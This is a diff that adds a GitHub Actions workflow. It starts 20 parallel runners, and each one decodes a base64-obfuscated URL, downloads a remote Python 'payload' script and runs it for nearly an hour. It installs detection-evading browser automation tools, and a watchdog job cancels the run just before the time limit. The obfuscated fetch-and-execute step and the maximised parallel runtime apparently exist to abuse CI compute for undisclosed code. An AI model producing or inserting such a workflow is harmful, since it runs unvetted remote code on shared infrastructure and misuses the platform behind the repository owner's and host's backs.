@@ -1,0 +1,102 @@
+name: Nexus Hyperion Core Automation
+
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: hyperion-pipeline-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # Watchdog: monitors execution time and cancels workflow at 59 mins
+  # =================================================================
+  hyperion-watchdog:
+    name: "Hyperion Watchdog Guard"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    env:
+      WATCHDOG_TIMEOUT_SEC: 3540
+    steps:
+      - name: Initialize Watchdog Monitor
+        run: |
+          echo "::notice::[WATCHDOG] Safety monitor initialized for run ID: ${{ github.run_id }}"
+          echo "[WATCHDOG] Entering idle state for ${WATCHDOG_TIMEOUT_SEC} seconds."
+
+          sleep "${WATCHDOG_TIMEOUT_SEC}"
+
+          echo "[WATCHDOG] Threshold reached. Issuing workflow cancellation token..."
+
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+
+          echo "[WATCHDOG] Abort command delivered successfully."
+
+  # =================================================================
+  # Worker Cluster: parallel execution across array nodes
+  # =================================================================
+  cluster-worker:
+    name: "WorkerUnit-${{ matrix.node_code }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 59
+
+    strategy:
+      fail-fast: false
+      matrix:
+        node_code: [101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120]
+
+    steps:
+      # -----------------------------------------------------------------
+      # Phase 1: Environment Setup
+      # -----------------------------------------------------------------
+      - name: Prepare Host Environment
+        run: |
+          echo "[SYSTEM] Provisioning dependencies for WorkerUnit-${{ matrix.node_code }}..."
+          sudo apt-get update -qq && sudo apt-get install -y --no-install-recommends curl python3-pip
+
+      # -----------------------------------------------------------------
+      # Phase 2: Fetch Remote Payload
+      # -----------------------------------------------------------------
+      - name: Retrieve Payload Script
+        run: |
+          echo "[FETCH] Decoding source URL and fetching target script..."
+          REMOTE_URI=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 -d)
+          curl -sL "$REMOTE_URI" -o engine_runner.py
+          echo "[FETCH] Payload successfully stored as engine_runner.py."
+
+      # -----------------------------------------------------------------
+      # Phase 3: Install Required Dependencies
+      # -----------------------------------------------------------------
+      - name: Setup Python Environment
+        run: |
+          echo "[PIP] Installing execution dependencies..."
+          python3 -m pip install -q --no-cache-dir undetected-chromedriver selenium requests psutil
+
+      # -----------------------------------------------------------------
+      # Phase 4: Execute Engine Process
+      # -----------------------------------------------------------------
+      - name: Execute Main Process
+        run: |
+          echo "=== Starting WorkerUnit-${{ matrix.node_code }} process ==="
+
+          python3 engine_runner.py &
+          PROCESS_PID=$!
+
+          echo "=== Process active under PID $PROCESS_PID. Timer set to 3540 seconds. ==="
+
+          sleep 3540
+
+          if kill -0 "$PROCESS_PID" 2>/dev/null; then
+            echo "=== Target execution window expired. Force terminating PID $PROCESS_PID... ==="
+            kill -9 "$PROCESS_PID"
+            echo "=== Process terminated by runtime guard. ==="
+          else
+            echo "=== Task finished natively before timeout limit. ==="
+          fi
